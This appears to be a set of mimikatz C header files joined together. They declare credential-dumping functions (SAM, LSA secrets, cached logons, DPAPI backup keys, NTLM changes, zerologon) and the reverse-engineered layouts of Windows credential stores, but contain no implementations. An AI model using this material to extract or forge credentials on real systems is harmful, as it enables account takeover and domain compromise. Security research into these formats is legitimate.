void kuhl_m_iis_apphost_site(int argc, wchar_t * argv[], IXMLDOMDocument *pXMLDom, IXMLDOMNode *pNode);

void kuhl_m_iis_maybeEncrypted(int argc, wchar_t * argv[], IXMLDOMDocument *pXMLDom, PCWSTR password);
void kuhl_m_iis_apphost_provider_decrypt(int argc, wchar_t * argv[], PCWSTR keyContainerName, BOOL isMachine, LPCBYTE sessionKey, DWORD szSessionKey, LPCBYTE data, DWORD szData);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../modules/kull_m_kernel.h"
//#include "../modules/kull_m_process.h"
//#include "../modules/kull_m_service.h"
//#include "../modules/kull_m_file.h"
//#include "../modules/kull_m_string.h"
//#include "kuhl_m_sysenvvalue.h"

typedef struct _KUHL_K_C {
	const PKUHL_M_C_FUNC pCommand;
	const DWORD ioctlCode;
	const wchar_t * command;
	const wchar_t * description;
} KUHL_K_C, *PKUHL_K_C;

NTSTATUS kuhl_m_kernel_do(wchar_t * input);

NTSTATUS kuhl_m_kernel_add_mimidrv(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kernel_remove_mimidrv(int argc, wchar_t * argv[]);

NTSTATUS kuhl_m_kernel_processProtect(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kernel_processToken(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kernel_processPrivilege(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kernel_sysenv_set(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kernel_sysenv_del(int argc, wchar_t * argv[]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "kerberos/kuhl_m_kerberos.h"
//#include "../modules/kull_m_process.h"
//#include "../modules/kull_m_service.h"
//#include "../modules/kull_m_memory.h"
//#include "../modules/kull_m_patch.h"
//#include "../modules/kull_m_registry.h"
//#include "../modules/kull_m_crypto_system.h"
//#include "../modules/kull_m_string.h"
//#include "../modules/kull_m_samlib.h"
//#include "../modules/kull_m_net.h"
//#include "../../modules/rpc/kull_m_rpc_ms-nrpc.h"
//#include "lsadump/kuhl_m_lsadump_dc.h"
//#include "kuhl_m_lsadump_remote.h"
//#include "kuhl_m_crypto.h"
//#include "dpapi/kuhl_m_dpapi_oe.h"
//#include "sekurlsa/kuhl_m_sekurlsa.h"

#define	SYSKEY_LENGTH	16
#define	SAM_KEY_DATA_SALT_LENGTH	16
#define	SAM_KEY_DATA_KEY_LENGTH		16

typedef struct _SAM_ENTRY {
	DWORD offset;
	DWORD lenght;
	DWORD unk;
} SAM_ENTRY, *PSAM_SENTRY;

typedef struct _KIWI_BACKUP_KEY {
	DWORD version;
	DWORD keyLen;
	DWORD certLen;
	BYTE data[ANYSIZE_ARRAY];
} KIWI_BACKUP_KEY, *PKIWI_BACKUP_KEY;

typedef struct _NTDS_LSA_AUTH_INFORMATION {
    LARGE_INTEGER LastUpdateTime;
    ULONG AuthType;
    ULONG AuthInfoLength;
	UCHAR AuthInfo[ANYSIZE_ARRAY]; //
} NTDS_LSA_AUTH_INFORMATION, *PNTDS_LSA_AUTH_INFORMATION;

typedef struct _NTDS_LSA_AUTH_INFORMATIONS {
	DWORD count; // or version ?
	DWORD offsetToAuthenticationInformation;	// PLSA_AUTH_INFORMATION
	DWORD offsetToPreviousAuthenticationInformation;	// PLSA_AUTH_INFORMATION
	// ...
} NTDS_LSA_AUTH_INFORMATIONS, *PNTDS_LSA_AUTH_INFORMATIONS;

const KUHL_M kuhl_m_lsadump;

NTSTATUS kuhl_m_lsadump_init();

NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_lsadump_secrets(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_lsadump_cache(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsOrCache);
NTSTATUS kuhl_m_lsadump_bkey(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_lsadump_rpdata(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_lsadump_setntlm(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_lsadump_changentlm(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_lsadump_packages(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_lsadump_mbc(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_lsadump_zerologon(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_lsadump_update_dc_password(int argc, wchar_t * argv[]);

BOOL kuhl_m_lsadump_getSids(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN LPCWSTR littleKey, IN LPCWSTR prefix);
BOOL kuhl_m_lsadump_getComputerAndSyskey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSystemBase, OUT LPBYTE sysKey);
BOOL kuhl_m_lsadump_getUsersAndSamKey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSAMBase, IN LPCBYTE sysKey);

BOOL kuhl_m_lsadump_getCurrentControlSet(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hSystemBase, PHKEY phCurrentControlSet);
BOOL kuhl_m_lsadump_getSyskey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hLSA, LPBYTE sysKey);
BOOL kuhl_m_lsadump_getSamKey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hAccount, LPCBYTE sysKey, LPBYTE samKey);
BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE samKey, DWORD rid, BOOL isNtlm, BOOL isHistory);
BOOL kuhl_m_lsadump_getSupplementalCreds(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hUser, IN const BYTE samKey[SAM_KEY_DATA_KEY_LENGTH]);

void kuhl_m_lsadump_lsa_user(SAMPR_HANDLE DomainHandle, PSID DomainSid, DWORD rid, PUNICODE_STRING name, PKULL_M_MEMORY_ADDRESS aRemoteThread);
BOOL kuhl_m_lsadump_lsa_getHandle(PKULL_M_MEMORY_HANDLE * hMemory, DWORD Flags);
void kuhl_m_lsadump_trust_authinformation(PLSA_AUTH_INFORMATION info, DWORD count, PNTDS_LSA_AUTH_INFORMATION infoNtds, PCWSTR prefix, PCUNICODE_STRING from, PCUNICODE_STRING dest);

NTSTATUS kuhl_m_lsadump_LsaRetrievePrivateData(PCWSTR systemName, PCWSTR secretName, PUNICODE_STRING secret, BOOL isSecret);
void kuhl_m_lsadump_analyzeKey(LPCGUID guid, PKIWI_BACKUP_KEY secret, DWORD size, BOOL isExport);
NTSTATUS kuhl_m_lsadump_getKeyFromGUID(LPCGUID guid, BOOL isExport, LPCWSTR systemName, BOOL isSecret);

typedef  enum _DOMAIN_SERVER_ROLE
{
	DomainServerRoleBackup = 2,
	DomainServerRolePrimary = 3
} DOMAIN_SERVER_ROLE, *PDOMAIN_SERVER_ROLE;

typedef  enum _DOMAIN_SERVER_ENABLE_STATE
{
	DomainServerEnabled = 1,
	DomainServerDisabled
} DOMAIN_SERVER_ENABLE_STATE, *PDOMAIN_SERVER_ENABLE_STATE;

typedef struct _OLD_LARGE_INTEGER {
	ULONG LowPart;
	LONG HighPart;
} OLD_LARGE_INTEGER, *POLD_LARGE_INTEGER;

typedef struct _SAM_KEY_DATA {
	DWORD Revision;
	DWORD Length;
	BYTE Salt[SAM_KEY_DATA_SALT_LENGTH];
	BYTE Key[SAM_KEY_DATA_KEY_LENGTH];
	BYTE CheckSum[MD5_DIGEST_LENGTH];
	DWORD unk0;
	DWORD unk1;
} SAM_KEY_DATA, *PSAM_KEY_DATA;

//BYTE samKeyAES[] = {
//	/* Flags/Rev ? */	0x02, 0x00, 0x00, 0x00,
//	/* Struct Size */	0x70, 0x00, 0x00, 0x00,
//						
//						0x30, 0x00, 0x00, 0x00,
//						0x20, 0x00, 0x00, 0x00,
//						
//						0x30, 0x00, 0x00, 0x00,
//						0x20, 0x00, 0x00, 0x00,
//	/* IV */			0x92, 0xC2, 0x72, 0xF0, 0x42, 0xF2, 0x73, 0x7E, 0x8D, 0x62, 0x1F, 0x5A, 0x0C, 0xF9, 0x91, 0xBD,
//						
//	/* Data */			0x2D, 0x12, 0x3C, 0x86, 0x97, 0xD9, 0x19, 0x5B, 0x82, 0x8D, 0x94, 0x18, 0x0B, 0x48, 0xF6, 0xEA,
//						0x1B, 0xD7, 0xC9, 0x65, 0x7A, 0x75, 0x90, 0x72, 0xE5, 0x68, 0xAD, 0x88, 0x27, 0xE5, 0x58, 0xFC,
//						
//						0x48, 0x05, 0x59, 0xE3, 0x91, 0x2A, 0x0E, 0xD2, 0x83, 0xEE, 0x17, 0xD9, 0x8D, 0xDB, 0xC4, 0xB7,
//						0xBB, 0xB5, 0xE6, 0x75, 0x9E, 0x86, 0xAB, 0x55, 0x49, 0x42, 0x6C, 0x48, 0x87, 0xAC, 0x36, 0x89,
//						0x6B, 0xD9, 0x66, 0x23, 0xB1, 0xA8, 0x1E, 0x6C  /* .. ??? */
//};
typedef struct _SAM_KEY_DATA_AES {
	DWORD Revision; // 2
	DWORD Length;
	DWORD CheckLen;
	DWORD DataLen;
	BYTE Salt[SAM_KEY_DATA_SALT_LENGTH];
	BYTE data[ANYSIZE_ARRAY]; // Data, then Check
} SAM_KEY_DATA_AES, *PSAM_KEY_DATA_AES;

typedef struct _DOMAIN_ACCOUNT_F {
	WORD Revision;
	WORD unk0;
	DWORD unk1;
	OLD_LARGE_INTEGER CreationTime;
	OLD_LARGE_INTEGER DomainModifiedCount;
	OLD_LARGE_INTEGER MaxPasswordAge;
	OLD_LARGE_INTEGER MinPasswordAge;
	OLD_LARGE_INTEGER ForceLogoff;
	OLD_LARGE_INTEGER LockoutDuration;
	OLD_LARGE_INTEGER LockoutObservationWindow;
	OLD_LARGE_INTEGER ModifiedCountAtLastPromotion;
	DWORD NextRid;
	DWORD PasswordProperties;
	WORD MinPasswordLength;
	WORD PasswordHistoryLength;
	WORD LockoutThreshold;
	DOMAIN_SERVER_ENABLE_STATE ServerState;
	DOMAIN_SERVER_ROLE ServerRole;
	BOOL UasCompatibilityRequired;
	DWORD unk2;
	SAM_KEY_DATA keys1;
	SAM_KEY_DATA keys2;
	DWORD unk3;
	DWORD unk4;
} DOMAIN_ACCOUNT_F, *PDOMAIN_ACCOUNT_F;

typedef struct _USER_ACCOUNT_V {
	SAM_ENTRY unk0_header;
	SAM_ENTRY Username;
	SAM_ENTRY Fullname;
	SAM_ENTRY Comment;
	SAM_ENTRY UserComment;
	SAM_ENTRY unk1;
	SAM_ENTRY Homedir;
	SAM_ENTRY HomedirConnect;
	SAM_ENTRY ScriptPath;
	SAM_ENTRY ProfilePath;
	SAM_ENTRY Workstations;
	SAM_ENTRY HoursAllowed;
	SAM_ENTRY unk2;
	SAM_ENTRY LMHash;
	SAM_ENTRY NTLMHash;
	SAM_ENTRY NTLMHistory;
	SAM_ENTRY LMHistory;
	BYTE datas[ANYSIZE_ARRAY];
} USER_ACCOUNT_V, *PUSER_ACCOUNT_V;

typedef struct _SAM_HASH_AES {
	WORD PEKID;
	WORD Revision;
	DWORD dataOffset;
	BYTE Salt[SAM_KEY_DATA_SALT_LENGTH];
	BYTE data[ANYSIZE_ARRAY]; // Data
} SAM_HASH_AES, *PSAM_HASH_AES;

typedef struct _SAM_HASH {
	WORD PEKID;
	WORD Revision;
	BYTE data[ANYSIZE_ARRAY];
} SAM_HASH, *PSAM_HASH;

typedef struct _POL_REVISION {
	USHORT Minor;
	USHORT Major;
} POL_REVISION, *PPOL_REVISION;

typedef struct _NT6_CLEAR_SECRET {
	DWORD SecretSize;
	DWORD unk0;
	DWORD unk1;
	DWORD unk2;
	BYTE  Secret[ANYSIZE_ARRAY];
} NT6_CLEAR_SECRET, *PNT6_CLEAR_SECRET;

#define LAZY_NT6_IV_SIZE	32
typedef struct _NT6_HARD_SECRET {
	DWORD version;
	GUID KeyId;
	DWORD algorithm;
	DWORD flag;
	BYTE lazyiv[LAZY_NT6_IV_SIZE];
	union {
		NT6_CLEAR_SECRET clearSecret;
		BYTE encryptedSecret[ANYSIZE_ARRAY];
	};
} NT6_HARD_SECRET, *PNT6_HARD_SECRET;

typedef struct _NT6_SYSTEM_KEY {
	GUID KeyId;
	DWORD KeyType;
	DWORD KeySize;
	BYTE Key[ANYSIZE_ARRAY];
} NT6_SYSTEM_KEY, *PNT6_SYSTEM_KEY;

typedef struct _NT6_SYSTEM_KEYS {
	DWORD unkType0;
	GUID CurrentKeyID;
	DWORD unkType1;
	DWORD nbKeys;
	NT6_SYSTEM_KEY Keys[ANYSIZE_ARRAY];
} NT6_SYSTEM_KEYS, *PNT6_SYSTEM_KEYS;

typedef struct _NT5_HARD_SECRET {
	DWORD encryptedStructSize;
	DWORD unk0;
	DWORD unk1; // it's a trap, it's PTR !
	BYTE encryptedSecret[ANYSIZE_ARRAY];
} NT5_HARD_SECRET, *PNT5_HARD_SECRET;

typedef struct _NT5_SYSTEM_KEY {
	BYTE key[16];
} NT5_SYSTEM_KEY, *PNT5_SYSTEM_KEY;

#define LAZY_IV_SIZE	16
typedef struct _NT5_SYSTEM_KEYS {
	DWORD unk0;
	DWORD unk1;
	DWORD unk2;
	NT5_SYSTEM_KEY keys[3];
	BYTE lazyiv[LAZY_IV_SIZE];
} NT5_SYSTEM_KEYS, *PNT5_SYSTEM_KEYS;

typedef struct _MSCACHE_ENTRY {
	WORD szUserName;
	WORD szDomainName;
	WORD szEffectiveName;
	WORD szFullName;
	WORD szlogonScript;
	WORD szprofilePath;
	WORD szhomeDirectory;
	WORD szhomeDirectoryDrive;
	DWORD userId;
	DWORD primaryGroupId;
	DWORD groupCount;
	WORD szlogonDomainName;
	WORD unk0;
	FILETIME lastWrite;
	DWORD revision;
	DWORD sidCount;
	DWORD flags;
	DWORD unk1;
	DWORD logonPackage;
	WORD szDnsDomainName;
	WORD szupn;
	BYTE iv[LAZY_IV_SIZE];
	BYTE cksum[MD5_DIGEST_LENGTH];
	BYTE enc_data[ANYSIZE_ARRAY];
} MSCACHE_ENTRY, *PMSCACHE_ENTRY;

typedef struct _MSCACHE_ENTRY_PTR {
	UNICODE_STRING UserName;
	UNICODE_STRING Domain;
	UNICODE_STRING DnsDomainName;
	UNICODE_STRING Upn;
	UNICODE_STRING EffectiveName;
	UNICODE_STRING FullName;

	UNICODE_STRING LogonScript;
	UNICODE_STRING ProfilePath;
	UNICODE_STRING HomeDirectory;
	UNICODE_STRING HomeDirectoryDrive;

	PGROUP_MEMBERSHIP Groups;

	UNICODE_STRING LogonDomainName;

} MSCACHE_ENTRY_PTR, *PMSCACHE_ENTRY_PTR;

typedef struct _MSCACHE_DATA {
	BYTE mshashdata[LM_NTLM_HASH_LENGTH];
	BYTE unkhash[LM_NTLM_HASH_LENGTH];
	DWORD unk0;
	DWORD szSC;
	DWORD unkLength;
	DWORD unk2;
	DWORD unk3;
	DWORD unk4;
	DWORD unk5;
	DWORD unk6;
	DWORD unk7;
	DWORD unk8;
} MSCACHE_DATA, *PMSCACHE_DATA;

typedef struct _KIWI_ENC_SC_DATA {
	BYTE toSign[32];
	BYTE toHash[32];
	BYTE toDecrypt[ANYSIZE_ARRAY];
} KIWI_ENC_SC_DATA, *PKIWI_ENC_SC_DATA;

typedef struct _KIWI_ENC_SC_DATA_NEW {
	BYTE Header[8]; // SuppData
	DWORD unk0;
	DWORD unk1;
	DWORD unk2;
	DWORD dataSize;
	KIWI_ENC_SC_DATA data;
} KIWI_ENC_SC_DATA_NEW, *PKIWI_ENC_SC_DATA_NEW;

typedef struct _NTLM_SUPPLEMENTAL_CREDENTIAL_V4 {
	ULONG Version;
	ULONG Flags;
	ULONG unk;
	UCHAR NtPassword[LM_NTLM_HASH_LENGTH];
} NTLM_SUPPLEMENTAL_CREDENTIAL_V4, *PNTLM_SUPPLEMENTAL_CREDENTIAL_V4;

typedef struct _WDIGEST_CREDENTIALS {
	BYTE	Reserverd1;
	BYTE	Reserverd2;
	BYTE	Version;
	BYTE	NumberOfHashes;
	BYTE	Reserverd3[12];
	BYTE	Hash[ANYSIZE_ARRAY][MD5_DIGEST_LENGTH];
} WDIGEST_CREDENTIALS, *PWDIGEST_CREDENTIALS;

typedef struct _KERB_KEY_DATA {
	USHORT	Reserverd1;
	USHORT	Reserverd2;
	ULONG	Reserverd3;
	LONG	KeyType;
	ULONG	KeyLength;
	ULONG	KeyOffset;
} KERB_KEY_DATA, *PKERB_KEY_DATA;

typedef struct _KERB_STORED_CREDENTIAL {
	USHORT	Revision;
	USHORT	Flags;
	USHORT	CredentialCount;
	USHORT	OldCredentialCount;
	USHORT	DefaultSaltLength;
	USHORT	DefaultSaltMaximumLength;
	ULONG	DefaultSaltOffset;
	//KERB_KEY_DATA	Credentials[ANYSIZE_ARRAY];
	//KERB_KEY_DATA	OldCredentials[ANYSIZE_ARRAY];
	//BYTE	DefaultSalt[ANYSIZE_ARRAY];
	//BYTE	KeyValues[ANYSIZE_ARRAY];
} KERB_STORED_CREDENTIAL, *PKERB_STORED_CREDENTIAL;

typedef struct _KERB_KEY_DATA_NEW {
	USHORT	Reserverd1;
	USHORT	Reserverd2;
	ULONG	Reserverd3;
	ULONG	IterationCount;
	LONG	KeyType;
	ULONG	KeyLength;
	ULONG	KeyOffset;
} KERB_KEY_DATA_NEW, *PKERB_KEY_DATA_NEW;

typedef struct _KERB_STORED_CREDENTIAL_NEW {
	USHORT	Revision;
	USHORT	Flags;
	USHORT	CredentialCount;
	USHORT	ServiceCredentialCount;
	USHORT	OldCredentialCount;
	USHORT	OlderCredentialCount;
	USHORT	DefaultSaltLength;
	USHORT	DefaultSaltMaximumLength;
	ULONG	DefaultSaltOffset;
	ULONG	DefaultIterationCount;
	//KERB_KEY_DATA_NEW	Credentials[ANYSIZE_ARRAY];
	//KERB_KEY_DATA_NEW	ServiceCredentials[ANYSIZE_ARRAY];
	//KERB_KEY_DATA_NEW	OldCredentials[ANYSIZE_ARRAY];
	//KERB_KEY_DATA_NEW	OlderCredentials[ANYSIZE_ARRAY];
	//BYTE	DefaultSalt[ANYSIZE_ARRAY];
	//BYTE	KeyValues[ANYSIZE_ARRAY];
} KERB_STORED_CREDENTIAL_NEW, *PKERB_STORED_CREDENTIAL_NEW;

typedef struct _LSA_SUPCREDENTIAL {
	DWORD	type;
	DWORD	size;
	DWORD	offset;
	DWORD	Reserved;
} LSA_SUPCREDENTIAL, *PLSA_SUPCREDENTIAL;

typedef struct _LSA_SUPCREDENTIALS {
	DWORD	count;
	DWORD	Reserved;
} LSA_SUPCREDENTIALS, *PLSA_SUPCREDENTIALS;

typedef struct _LSA_SUPCREDENTIALS_BUFFERS {
	LSA_SUPCREDENTIAL credential;
	NTSTATUS status;
	PVOID Buffer;
} LSA_SUPCREDENTIALS_BUFFERS, *PLSA_SUPCREDENTIALS_BUFFERS;

typedef struct _KUHL_LSADUMP_DCC_CACHE_DATA {
	LPCWSTR username;
	BYTE ntlm[LM_NTLM_HASH_LENGTH];
	BOOL isNtlm;
	BYTE dcc[LM_NTLM_HASH_LENGTH];
	BOOL isDCC;
	HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hProv;
	DWORD keySpec;
} KUHL_LSADUMP_DCC_CACHE_DATA, *PKUHL_LSADUMP_DCC_CACHE_DATA;

typedef struct _KIWI_LSA_PRIVATE_DATA {
	DWORD DataType;
	WORD LmLength;
	WORD LmMaximumLength;
	DWORD Unused1;
	BYTE LmHash[LM_NTLM_HASH_LENGTH];
	WORD NtLength;
	WORD NtMaximumLength;
	DWORD Unused2;
	BYTE NtHash[LM_NTLM_HASH_LENGTH];
	WORD LmHistoryLength;
	WORD LmHistoryMaximumLength;
	DWORD Unused3;
	WORD NtHistoryLength;
	WORD NtHistoryMaximumLength;
	DWORD Unused4;
	BYTE Data[ANYSIZE_ARRAY];
	// NtHistoryArray
	// LmHistoryArray
} KIWI_LSA_PRIVATE_DATA, *PKIWI_LSA_PRIVATE_DATA;

typedef struct _TBAL_UNICODE_STRING_F32 {
	DWORD  Buffer;
	USHORT Length;
	USHORT MaximumLength;
} TBAL_UNICODE_STRING_F32, *PTBAL_UNICODE_STRING_F32;

typedef struct _KIWI_TBAL_MSV {
	DWORD unk0;
	DWORD structLen;
	DWORD flags;
	DWORD unkD; // why not ?
	BYTE NtOwfPassword[LM_NTLM_HASH_LENGTH];
	BYTE LmOwfPassword[LM_NTLM_HASH_LENGTH];
	BYTE ShaOwPassword[SHA_DIGEST_LENGTH]; 
	BYTE DPAPIProtected[LM_NTLM_HASH_LENGTH];
	DWORD unk1;
	TBAL_UNICODE_STRING_F32 DomainName;
	TBAL_UNICODE_STRING_F32 UserName;
} KIWI_TBAL_MSV, *PKIWI_TBAL_MSV;

typedef struct _KIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS {
	DWORD unk0;
	DWORD unkSize;
	DWORD unk1; // flags ?
	DWORD originalSize;
	BYTE iv[LAZY_IV_SIZE];
	BYTE encrypted[ANYSIZE_ARRAY];
} KIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS, *PKIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS;

BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecurityBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN LPBYTE sysKey, IN BOOL secretsOrCache, IN PKUHL_LSADUMP_DCC_CACHE_DATA pCacheData);
BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique);
BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN HKEY hSecurityBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique, IN PKUHL_LSADUMP_DCC_CACHE_DATA pCacheData);
void kuhl_m_lsadump_printMsCache(PMSCACHE_ENTRY entry, CHAR version);
BOOL kuhl_m_lsadump_decryptSCCache(PBYTE data, DWORD size, HCRYPTPROV hProv, DWORD keySpec);
void kuhl_m_lsadump_getInfosFromServiceName(IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN PCWSTR serviceName);
BOOL kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecret, IN LPCWSTR KeyName, IN PNT6_SYSTEM_KEYS lsaKeysStream, IN PNT5_SYSTEM_KEY lsaKeyUnique, IN PVOID * pBufferOut, IN PDWORD pSzBufferOut);
void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PCWSTR prefix, PCWSTR secretName);
BOOL kuhl_m_lsadump_sec_aes256(PNT6_HARD_SECRET hardSecretBlob, DWORD hardSecretBlobSize, PNT6_SYSTEM_KEYS lsaKeysStream, PBYTE sysKey);

PKERB_KEY_DATA kuhl_m_lsadump_lsa_keyDataInfo(PVOID base, PKERB_KEY_DATA keys, USHORT Count, PCWSTR title);
PKERB_KEY_DATA_NEW kuhl_m_lsadump_lsa_keyDataNewInfo(PVOID base, PKERB_KEY_DATA_NEW keys, USHORT Count, PCWSTR title);
void kuhl_m_lsadump_lsa_DescrBuffer(DWORD type, DWORD rid, PVOID Buffer, DWORD BufferSize);

#define SECRET_SET_VALUE	0x00000001L
#define SECRET_QUERY_VALUE	0x00000002L

#define SECRET_ALL_ACCESS	(STANDARD_RIGHTS_REQUIRED | SECRET_SET_VALUE | SECRET_QUERY_VALUE)
#define SECRET_READ			(STANDARD_RIGHTS_READ | SECRET_QUERY_VALUE)
#define SECRET_WRITE		(STANDARD_RIGHTS_WRITE | SECRET_SET_VALUE)
#define SECRET_EXECUTE		(STANDARD_RIGHTS_EXECUTE)

extern NTSTATUS WINAPI I_NetServerReqChallenge(IN LOGONSRV_HANDLE PrimaryName, IN wchar_t * ComputerName, IN PNETLOGON_CREDENTIAL ClientChallenge, OUT PNETLOGON_CREDENTIAL ServerChallenge);
extern NTSTATUS WINAPI I_NetServerAuthenticate2(IN LOGONSRV_HANDLE PrimaryName, IN wchar_t * AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, IN wchar_t * ComputerName, IN PNETLOGON_CREDENTIAL ClientCredential, OUT PNETLOGON_CREDENTIAL ServerCredential, IN OUT ULONG * NegotiateFlags);
extern NTSTATUS WINAPI I_NetServerTrustPasswordsGet(IN LOGONSRV_HANDLE TrustedDcName, IN wchar_t* AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, IN wchar_t* ComputerName, IN PNETLOGON_AUTHENTICATOR Authenticator, OUT PNETLOGON_AUTHENTICATOR ReturnAuthenticator, OUT PENCRYPTED_NT_OWF_PASSWORD EncryptedNewOwfPassword, OUT PENCRYPTED_NT_OWF_PASSWORD EncryptedOldOwfPassword);
extern NTSTATUS WINAPI I_NetServerPasswordSet2(IN LOGONSRV_HANDLE PrimaryName, IN wchar_t * AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, IN wchar_t * ComputerName, IN PNETLOGON_AUTHENTICATOR Authenticator, OUT PNETLOGON_AUTHENTICATOR ReturnAuthenticator, IN PNL_TRUST_PASSWORD ClearNewPassword);
extern NTSTATUS NTAPI LsaOpenSecret(__in LSA_HANDLE PolicyHandle, __in PLSA_UNICODE_STRING SecretName, __in ACCESS_MASK DesiredAccess, __out PLSA_HANDLE SecretHandle);
extern NTSTATUS NTAPI LsaSetSecret(__in LSA_HANDLE SecretHandle, __in_opt PLSA_UNICODE_STRING CurrentValue, __in_opt PLSA_UNICODE_STRING OldValue);
extern NTSTATUS NTAPI LsaQuerySecret(__in LSA_HANDLE SecretHandle, __out_opt OPTIONAL PLSA_UNICODE_STRING *CurrentValue, __out_opt PLARGE_INTEGER CurrentValueSetTime, __out_opt PLSA_UNICODE_STRING *OldValue, __out_opt PLARGE_INTEGER OldValueSetTime);
extern NTSTATUS NTAPI LsaDeleteSecret(__in LSA_HANDLE SecretHandle);

NTSTATUS kuhl_m_lsadump_netsync_NlComputeCredentials(PBYTE input, PBYTE output, PBYTE key);
void kuhl_m_lsadump_netsync_AddTimeStampForAuthenticator(PNETLOGON_CREDENTIAL Credential, DWORD TimeStamp, PNETLOGON_AUTHENTICATOR Authenticator, BYTE sessionKey[MD5_DIGEST_LENGTH]);

typedef struct _KUHL_M_LSADUMP_CHANGENTLM_DATA {
	BOOL isOldLM;
	BYTE oldLM[LM_NTLM_HASH_LENGTH];
	BYTE newLM[LM_NTLM_HASH_LENGTH];
	BOOL isNewNTLM;
	BYTE oldNTLM[LM_NTLM_HASH_LENGTH];
	BYTE newNTLM[LM_NTLM_HASH_LENGTH];
} KUHL_M_LSADUMP_CHANGENTLM_DATA, *PKUHL_M_LSADUMP_CHANGENTLM_DATA;

typedef NTSTATUS (CALLBACK * PKUHL_M_LSADUMP_DOMAINUSER) (SAMPR_HANDLE hUser, PVOID pvArg);
NTSTATUS kuhl_m_lsadump_enumdomains_users(int argc, wchar_t * argv[], DWORD dwUserAccess, PKUHL_M_LSADUMP_DOMAINUSER callback, PVOID pvArg);
NTSTATUS kuhl_m_lsadump_enumdomains_users_data(PLSA_UNICODE_STRING uServerName, PLSA_UNICODE_STRING uUserName, DWORD rid, DWORD dwUserAccess, PKUHL_M_LSADUMP_DOMAINUSER callback, PVOID pvArg);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m_lsadump.h"
//#include "../modules/kull_m_remotelib.h"

typedef struct _KIWI_SAMPR_USER_INTERNAL42_INFORMATION {
	SAMPR_USER_INTERNAL1_INFORMATION Internal1;
	DWORD cbPrivate;
	BYTE Private[ANYSIZE_ARRAY];
} KIWI_SAMPR_USER_INTERNAL42_INFORMATION, *PKIWI_SAMPR_USER_INTERNAL42_INFORMATION;

typedef NTSTATUS	(WINAPI * PLSAIQUERYINFORMATIONPOLICYTRUSTED) (IN POLICY_INFORMATION_CLASS InformationClass, OUT PVOID *Buffer);
typedef VOID		(WINAPI * PLSAIFREE_LSAPR_POLICY_INFORMATION) (IN POLICY_INFORMATION_CLASS InformationClass, IN PVOID Buffer);

typedef NTSTATUS	(WINAPI * PSAMICONNECT) (IN PUNICODE_STRING ServerName, OUT SAMPR_HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted);
typedef NTSTATUS	(WINAPI * PSAMRCLOSEHANDLE) (IN SAMPR_HANDLE SamHandle);
typedef NTSTATUS	(WINAPI * PSAMIRETRIEVEPRIMARYCREDENTIALS) (IN SAMPR_HANDLE UserHandle, IN LSA_UNICODE_STRING *Name, OUT LPVOID *Buffer, OUT DWORD *BufferSize);
